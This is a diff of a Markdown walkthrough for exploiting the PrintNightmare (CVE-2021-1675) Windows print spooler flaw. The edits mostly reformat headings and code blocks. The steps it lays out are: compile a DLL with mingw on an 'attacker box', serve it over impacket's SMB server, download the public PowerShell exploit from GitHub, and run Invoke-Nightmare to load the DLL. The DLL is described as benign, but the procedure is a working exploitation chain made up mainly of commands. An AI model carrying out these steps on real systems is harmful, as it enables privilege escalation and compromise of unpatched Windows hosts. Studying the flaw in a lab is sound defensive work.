@@ -8,17 +8,22 @@ get-service spooler
 ```
 ![image](https://user-images.githubusercontent.com/49488209/124728554-9a371b80-df07-11eb-8e91-8d30eea92e73.png)
 
-#### If spooler isn't running, won't be vulnerable, you can quit here and now.
-#### Otherwise if running, begin exploitation.
+If spooler isn't running, won't be vulnerable, you can quit here and now.
+Otherwise if running, begin exploitation.
 
-## prepare non-malicious DLL
+## Prepare non-Malicious DLL
+Run this on your attacker box
 
-#### install dependencies
+#### Install Dependencies
 sudo apt apt install gcc-mingw-w64
 sudo apt-get install g++-mingw-w64-x86-64
 
-### write the dll
+### Write the Dll
+```bash
 nano nightmare.cpp
+```
+
+This DLL will just print an innocent, non-malicious file called *Printnightmare* to *C:\*
 
 ```cpp
 #include <windows.h>
@@ -36,7 +41,7 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
 }
 ```
 
-#### compile dll
+#### Compile DLL
 ```bash
 sudo x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL nightmare.cpp         
 sudo x86_64-w64-mingw32-g++ -shared -o nightmare.dll nightmare.o -Wl,--out-implib,nightmare.a
@@ -46,14 +51,14 @@ sudo x86_64-w64-mingw32-g++ -shared -o nightmare.dll nightmare.o -Wl,--out-impli
 
 
 ## Transfer DLL however you like, impacket's smbserver.py works
-### in kali
+### In Kali
 ```bash
 sudo impacket-smbserver kali . -smb2support
 ```
 ![2021-07-07_09-43](https://user-images.githubusercontent.com/49488209/124728745-bdfa6180-df07-11eb-876b-1155026cb191.png)
 
 
-### copy in Windows
+### Copy from Kali to in Windows
 ```cmd
 :: I copied mine into C:\
 copy \\yourip\\kali\\nightmare.dll
@@ -63,12 +68,16 @@ copy \\yourip\\kali\\nightmare.dll
 
 ## Exploit
 ### Pull Powershell exploit, written by John Hammond and Caleb from Huntress
-invoke-webrequest -uri "https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1" -UseBasicParsing -outfile CVE-2021-1675.ps1
 
-#### deploy
+```powershell
+invoke-webrequest -uri "https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1" -UseBasicParsing -outfile CVE-2021-1675.ps1
+```
+
+#### Deploy exploit
+```powershell
 import-module .\CVE-2021-1675.ps1
 Invoke-Nightmare -DLL "C:\nightmare.dll"
-
+```
 ![image](https://user-images.githubusercontent.com/49488209/124728899-e2563e00-df07-11eb-9b30-96d8509caad8.png)
 
 
